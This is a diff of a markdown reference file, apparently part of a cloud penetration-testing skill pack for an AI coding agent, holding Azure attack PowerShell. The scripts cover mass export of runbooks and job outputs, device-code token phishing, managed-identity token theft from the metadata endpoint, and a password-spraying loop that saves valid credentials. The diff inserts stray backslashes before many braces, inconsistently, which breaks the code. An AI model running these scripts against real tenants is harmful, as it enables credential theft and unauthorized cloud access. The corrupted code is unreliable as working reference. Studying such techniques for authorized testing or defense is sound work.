@@ -8,7 +8,12 @@ lang: "英文"
 tier: 3
 volume: "09-harness"
 sourceUrl: "https://github.com/zebbern/claude-code-guide"
-entryUrl: "https://github.com/zebbern/claude-code-guide/blob/64c890fe74c3ccfad673dc9c71dc85b8dd2f4817/README.md"
+entryUrl: "https://github.com/zebbern/claude-code-guide/blob/64c890fe74c3ccfad673dc9c71dc85b8dd2f4817/skills/cloud-penetration-testing/references/advanced-cloud-scripts.md"
+sourceRel: "skills/cloud-penetration-testing/references/advanced-cloud-scripts.md"
+rawUrl: "/raw/09-harness/claude-code-guide-zebbern/skills/cloud-penetration-testing/references/advanced-cloud-scripts.md"
+sourceSha256: "bab614720e84202dc0eb3de89b9514513e9273eb8d40cd7899114b8767ddceff"
+pageSha256: "bab614720e84202dc0eb3de89b9514513e9273eb8d40cd7899114b8767ddceff"
+contentMode: "local-full"
 zh: ""
 ---
 
@@ -30,11 +35,11 @@ Foreach($s in $subs){
     $autoaccounts = Get-AzAutomationAccount | Select-Object AutomationAccountName,ResourceGroupName
     foreach ($i in $autoaccounts){
         $runbooks += Get-AzAutomationRunbook -AutomationAccountName $i.AutomationAccountName -ResourceGroupName $i.ResourceGroupName | Select-Object AutomationAccountName,ResourceGroupName,Name
-    }
-    foreach($r in $runbooks){
+    \}
+    foreach($r in $runbooks)\{
         Export-AzAutomationRunbook -AutomationAccountName $r.AutomationAccountName -ResourceGroupName $r.ResourceGroupName -Name $r.Name -OutputFolder .\$subscriptionid\
-    }
-}
+    \}
+\}
 ```
 
 ### Export All Automation Job Outputs
@@ -42,18 +47,18 @@ Foreach($s in $subs){
 ```powershell
 $subs = Get-AzSubscription
 $jobout = @()
-Foreach($s in $subs){
+Foreach($s in $subs)\{
     $subscriptionid = $s.SubscriptionId
     Select-AzSubscription -Subscription $subscriptionid
     $jobs = @()
     $autoaccounts = Get-AzAutomationAccount | Select-Object AutomationAccountName,ResourceGroupName
     foreach ($i in $autoaccounts){
         $jobs += Get-AzAutomationJob $i.AutomationAccountName -ResourceGroupName $i.ResourceGroupName | Select-Object AutomationAccountName,ResourceGroupName,JobId
-    }
-    foreach($r in $jobs){
+    \}
+    foreach($r in $jobs)\{
         $jobout += Get-AzAutomationJobOutput -AutomationAccountName $r.AutomationAccountName -ResourceGroupName $r.ResourceGroupName -JobId $r.JobId
-    }
-}
+    \}
+\}
 $jobout | Out-File -Encoding ascii joboutputs.txt
 ```
 
@@ -63,7 +68,7 @@ $jobout | Out-File -Encoding ascii joboutputs.txt
 
 ```powershell
 $functionapps = Get-AzFunctionApp
-foreach($f in $functionapps){
+foreach($f in $functionapps)\{
     $f.EnabledHostname
 }
 ```
@@ -113,7 +118,7 @@ Navigate to https://microsoft.com/devicelogin and enter the code.
 ### Retrieve Access Tokens
 
 ```powershell
-$body = @{
+$body = @\{
     "client_id"  = "1950a258-227b-4e31-a9cf-717495945fc2"
     "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
     "code"       = $authResponse.device_code
@@ -134,7 +139,7 @@ $Tokens
 Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
 
 # Full instance metadata
-$instance = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/instance?api-version=2018-02-01' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
+$instance = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/instance?api-version=2018-02-01' -Method GET -Headers @\{Metadata="true"\} -UseBasicParsing
 $instance
 ```
 
@@ -260,29 +265,29 @@ $userlist = Get-Content userlist.txt
 $passlist = Get-Content passlist.txt
 $linenumber = 0
 $count = $userlist.count
-foreach($line in $userlist){
+foreach($line in $userlist)\{
     $user = $line
     $pass = ConvertTo-SecureString $passlist[$linenumber] -AsPlainText -Force
     $current = $linenumber + 1
     Write-Host -NoNewline ("`r[" + $current + "/" + $count + "]" + "Trying: " + $user + " and " + $passlist[$linenumber])
     $linenumber++
     $Cred = New-Object System.Management.Automation.PSCredential ($user, $pass)
-    try {
+    try \{
         Connect-AzAccount -Credential $Cred -ErrorAction Stop -WarningAction SilentlyContinue
         Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])
         Write-Host -ForegroundColor green ("`nGot something here: $user and " + $passlist[$linenumber - 1])
     }
     catch {
         $Failure = $_.Exception
-        if ($Failure -match "ID3242") { continue }
-        else {
+        if ($Failure -match "ID3242") \{ continue \}
+        else \{
             Write-Host -ForegroundColor green ("`nGot something here: $user and " + $passlist[$linenumber - 1])
             Add-Content valid-creds.txt ($user + "|" + $passlist[$linenumber - 1])
             Add-Content valid-creds.txt $Failure.Message
             Write-Host -ForegroundColor red $Failure.Message
-        }
-    }
-}
+        \}
+    \}
+\}
 ```
 
 ## Service Principal Attack Path
